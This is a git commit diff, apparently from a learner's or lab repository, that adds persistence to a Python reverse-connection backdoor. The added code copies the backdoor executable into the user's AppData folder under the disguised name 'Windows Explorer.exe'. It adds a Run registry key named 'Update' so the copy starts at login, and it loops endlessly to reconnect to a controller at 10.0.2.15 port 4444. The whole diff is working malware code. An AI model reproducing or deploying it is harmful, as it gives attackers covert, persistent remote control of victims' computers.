389e46fde0ddd7aec6ad6378649e32fce48f4abd
root <gvrosun@gmail.com>
2020-07-22 10:13:05 +0530

    reverse_backdoor v1.7 (Persistent support)

--- reverse_connection/reverse_backdoor.py
+++ reverse_connection/reverse_backdoor.py
@@ -6,12 +6,21 @@ import json
 import os
 import base64
 import sys
+import shutil
+import time
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -64,5 +73,10 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("10.0.2.15", 4444)
-my_backdoor.run()
+while True:
+    try:
+        my_backdoor = Backdoor("10.0.2.15", 4444)
+        my_backdoor.run()
+    except Exception:
+        time.sleep(10)
+        continue
